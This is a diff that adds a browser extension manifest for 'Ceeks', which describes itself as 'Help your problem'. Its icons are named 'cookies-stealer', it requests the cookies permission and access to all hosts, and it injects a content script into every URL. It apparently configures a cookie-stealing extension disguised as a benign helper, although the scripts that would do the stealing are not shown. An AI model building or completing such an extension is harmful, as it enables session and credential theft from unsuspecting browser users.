@@ -1,0 +1,29 @@
+{
+	"name": "Ceeks",
+	"description" : "Help your problem",
+	"version": "1.0.0",
+	"manifest_version": 3,
+	"action": {
+		"default_popup": "popup.html"
+	},
+	"icons":  {
+		"16": "icons/cookies-stealer16.png",
+		"32": "icons/cookies-stealer32.png",
+		"48": "icons/cookies-stealer48.png",
+		"128": "icons/cookies-stealer128.png"
+	},
+  "background": {
+    "service_worker": "background.js"
+  },
+	"content_scripts": [{
+		"matches": ["<all_urls>"],
+		"js": ["content.js"]
+}],
+"permissions": [
+  "activeTab",
+  "cookies"
+],
+	"host_permissions": [
+		"*://*/*"
+	]
+}
